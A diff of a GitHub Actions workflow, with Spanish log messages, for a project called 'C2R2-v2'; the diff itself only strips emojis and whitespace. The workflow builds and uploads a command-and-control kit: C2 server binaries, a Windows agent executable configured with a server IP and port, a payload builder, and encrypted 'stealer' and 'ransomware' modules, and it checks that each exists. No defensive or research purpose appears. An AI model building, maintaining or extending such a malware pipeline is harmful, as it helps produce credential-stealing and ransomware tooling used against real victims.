@@ -1,4 +1,4 @@
-name: 🔨 C2R2-v2 Build & Test
+name:  C2R2-v2 Build & Test
 
 on:
   push:
@@ -13,9 +13,9 @@ env:
 
 jobs:
   build-test:
-    name: 🐳 Docker Multi-Arch Build
+    name:  Docker Multi-Arch Build
     runs-on: ubuntu-latest
-    
+
     strategy:
       fail-fast: false
       matrix:
@@ -26,35 +26,35 @@ jobs:
           - name: "Production Build"
             production: "true"
             agent_name: "agent-prod"
-    
+
     steps:
-      - name: 📥 Checkout repository
+      - name:  Checkout repository
         uses: actions/checkout@v4
-      
-      - name: 🐳 Set up Docker Buildx
+
+      - name:  Set up Docker Buildx
         uses: docker/setup-buildx-action@v3
-      
-      - name: 🔍 Verify Dockerfile
+
+      - name:  Verify Dockerfile
         run: |
-          echo "📋 Verificando Dockerfile..."
+          echo " Verificando Dockerfile..."
           if [ ! -f Dockerfile ]; then
-            echo "❌ Dockerfile no encontrado"
+            echo " Dockerfile no encontrado"
             exit 1
           fi
-          echo "✅ Dockerfile encontrado"
-      
-      - name: 🔨 Build All Components
+          echo " Dockerfile encontrado"
+
+      - name:  Build All Components
         run: |
           echo "╔════════════════════════════════════════╗"
           echo "║   C2R2-v2 CI/CD Build Test            ║"
           echo "╚════════════════════════════════════════╝"
           echo ""
-          echo "📋 Configuración:"
+          echo " Configuración:"
           echo "   • Servidor: ${{ env.DEFAULT_IP }}:${{ env.DEFAULT_PORT }}"
           echo "   • Agente: ${{ matrix.agent_name }}.exe"
           echo "   • Modo: ${{ matrix.name }}"
           echo ""
-          
+
           docker build \
             --build-arg SERVER_IP="${{ env.DEFAULT_IP }}" \
             --build-arg SERVER_PORT="${{ env.DEFAULT_PORT }}" \
@@ -63,119 +63,119 @@ jobs:
             --tag c2r2-builder:${{ github.sha }} \
             --progress=plain \
             .
-      
-      - name: 📦 Extract Build Artifacts
+
+      - name:  Extract Build Artifacts
         run: |
-          echo "📦 Extrayendo binarios compilados..."
-          
+          echo " Extrayendo binarios compilados..."
+
           # Crear directorio de salida
           mkdir -p dist
-          
+
           # Crear contenedor temporal y extraer archivos
           CONTAINER_ID=$(docker create c2r2-builder:${{ github.sha }})
           docker cp $CONTAINER_ID:/build_output/. dist/
           docker rm $CONTAINER_ID
-          
-          echo "✅ Archivos extraídos a dist/"
+
+          echo " Archivos extraídos a dist/"
           ls -lh dist/
-      
-      - name: ✅ Verify Build Outputs
+
+      - name:  Verify Build Outputs
         run: |
-          echo "🔍 Verificando binarios generados..."
-          
+          echo " Verificando binarios generados..."
+
           # Servidor x86_64
           if [ -f dist/c2r2-server ]; then
-            echo "✅ Servidor x86_64: $(du -h dist/c2r2-server | cut -f1)"
+            echo " Servidor x86_64: $(du -h dist/c2r2-server | cut -f1)"
           else
-            echo "❌ Servidor x86_64 no encontrado"
+            echo " Servidor x86_64 no encontrado"
             exit 1
           fi
-          
+
           # Servidor ARM64
           if [ -f dist/c2r2-server-arm64 ]; then
-            echo "✅ Servidor ARM64: $(du -h dist/c2r2-server-arm64 | cut -f1)"
+            echo " Servidor ARM64: $(du -h dist/c2r2-server-arm64 | cut -f1)"
           else
-            echo "❌ Servidor ARM64 no encontrado"
+            echo " Servidor ARM64 no encontrado"
             exit 1
           fi
-          
+
           # Agente Windows
           if [ -f "dist/${{ matrix.agent_name }}.exe" ]; then
-            echo "✅ Agente Windows: $(du -h dist/${{ matrix.agent_name }}.exe | cut -f1)"
+            echo " Agente Windows: $(du -h dist/${{ matrix.agent_name }}.exe | cut -f1)"
           else
-            echo "❌ Agente ${{ matrix.agent_name }}.exe no encontrado"
+            echo " Agente ${{ matrix.agent_name }}.exe no encontrado"
             exit 1
           fi
-          
+
           # Builder
           if [ -f dist/builder ]; then
-            echo "✅ Builder: $(du -h dist/builder | cut -f1)"
+            echo " Builder: $(du -h dist/builder | cut -f1)"
           else
-            echo "❌ Builder no encontrado"
+            echo " Builder no encontrado"
             exit 1
           fi
-          
+
           # Módulos encriptados
           if [ -f dist/modules/stealer.dll.enc ]; then
-            echo "✅ Stealer módulo encriptado: $(du -h dist/modules/stealer.dll.enc | cut -f1)"
+            echo " Stealer módulo encriptado: $(du -h dist/modules/stealer.dll.enc | cut -f1)"
           else
-            echo "❌ Stealer módulo no encontrado"
+            echo " Stealer módulo no encontrado"
             exit 1
           fi
-          
+
           if [ -f dist/modules/ransomware.dll.enc ]; then
-            echo "✅ Ransomware módulo encriptado: $(du -h dist/modules/ransomware.dll.enc | cut -f1)"
+            echo " Ransomware módulo encriptado: $(du -h dist/modules/ransomware.dll.enc | cut -f1)"
           else
-            echo "❌ Ransomware módulo no encontrado"
+            echo " Ransomware módulo no encontrado"
             exit 1
           fi
-          
+
           echo ""
-          echo "✅ Todos los binarios verificados correctamente"
-      
-      - name: 📊 Build Info
+          echo " Todos los binarios verificados correctamente"
+
+      - name:  Build Info
         run: |
           if [ -f dist/BUILD_INFO.txt ]; then
-            echo "📋 Información de compilación:"
+            echo " Información de compilación:"
             cat dist/BUILD_INFO.txt
           fi
-      
-      - name: 📤 Upload Build Artifacts
+
+      - name:  Upload Build Artifacts
         uses: actions/upload-artifact@v4
         with:
           name: c2r2-binaries-${{ matrix.agent_name }}-${{ github.sha }}
           path: dist/
           retention-days: 7
           if-no-files-found: error
-      
-      - name: 🧹 Cleanup
+
+      - name:  Cleanup
         if: always()
         run: |
-          echo "🧹 Limpiando recursos Docker..."
+          echo " Limpiando recursos Docker..."
           docker system prune -f
 
   summary:
-    name: 📊 Build Summary
+    name:  Build Summary
     runs-on: ubuntu-latest
     needs: build-test
     if: always()
-    
+
     steps:
-      - name: 📋 Report Status
+      - name:  Report Status
         run: |
           echo "╔════════════════════════════════════════╗"
           echo "║   C2R2-v2 Build Summary                ║"
           echo "╚════════════════════════════════════════╝"
           echo ""
-          echo "🎯 Commit: ${{ github.sha }}"
-          echo "🌿 Branch: ${{ github.ref_name }}"
-          echo "👤 Author: ${{ github.actor }}"
+          echo " Commit: ${{ github.sha }}"
+          echo " Branch: ${{ github.ref_name }}"
+          echo " Author: ${{ github.actor }}"
           echo ""
-          
+
           if [ "${{ needs.build-test.result }}" == "success" ]; then
-            echo "✅ Build exitoso - Todos los componentes compilados"
+            echo " Build exitoso - Todos los componentes compilados"
             exit 0
           else
-            echo "❌ Build fallido - Revisar logs de compilación"
+            echo " Build fallido - Revisar logs de compilación"
             exit 1
           fi
